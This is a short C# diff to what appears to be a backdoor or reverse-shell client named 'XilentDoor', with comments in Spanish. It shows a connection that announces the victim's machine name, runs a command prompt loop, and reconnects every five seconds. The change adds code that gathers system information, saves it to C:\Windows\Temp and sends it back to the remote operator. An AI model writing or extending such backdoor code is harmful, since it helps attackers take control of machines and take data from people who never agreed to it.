@@ -27,6 +27,12 @@ namespace XilentDoor.Core
 
                     writer.WriteLine("[+] Conexión establecida desde " + Environment.MachineName);
 
+                    // Guarda la información del sistema en un archivo en C:\Windows\Temp
+                    string tempPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp", "SystemInfo.txt");
+                    File.WriteAllText(tempPath, SystemInfo.GetInfo());
+
+                    writer.WriteLine(SystemInfo.GetInfo()); // Envía información del sistema
+
                     while (true)
                     {
                         ShowPrompt();
@@ -69,7 +75,7 @@ namespace XilentDoor.Core
                     client?.Close();
                 }
 
-                // Esperar un tiempo antes de intentar reconectar
+                // Espera un tiempo antes de intentar reconectar (5 segundos)
                 Thread.Sleep(5000);
             }
         }
